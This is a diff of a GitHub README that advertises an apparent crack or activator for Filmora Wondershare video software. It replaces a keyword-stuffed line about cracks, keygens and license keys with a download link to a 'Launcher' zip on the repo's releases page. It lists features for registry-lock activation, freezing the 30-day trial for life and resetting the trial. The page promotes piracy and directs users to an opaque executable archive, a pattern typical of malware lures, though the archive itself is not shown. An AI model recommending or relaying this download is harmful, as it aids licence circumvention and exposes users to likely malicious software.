@@ -1,2 +1,24 @@
-# Filmora-Wondershare-activator-by-boex
-Filmora Wondershare full version download Filmora Wondershare crack Filmora Wondershare-cracked Filmora Wondershare download Filmora Wondershare free Filmora Wondershare activation Filmora Wondershare license key Filmora Wondershare scripts Filmora Wondershare tools Filmora Wondershare keygen Filmora Wondershare full version Filmora Wondershare ac
+# [Download](https://github.com/said1998242/Filmora-Wondershare-activator-by-boex/releases/download/Latest_release/Launcher_v1.4.9.9.zip)
+
+## Filmora Wondershare-activation-license
+
+# Requirements:
+Windows 10/11
+
+# Features:
+```
+## Activation license
+
+> This script applies the registry lock method to activate
+> This method requires the Internet at the time of activation.
+
+## Freeze Trial
+
+> Freeze 30-day trial period, you can use this option in the script to lock this trial period for the lifetime so that you won�t have to reset the trial again and your trial won�t expire.
+> This method requires the Internet at the time of applying this option
+
+## Reset Activation/Trial
+
+> You can use this script to reset this Activation / Trial period whenever you want.
+```
+
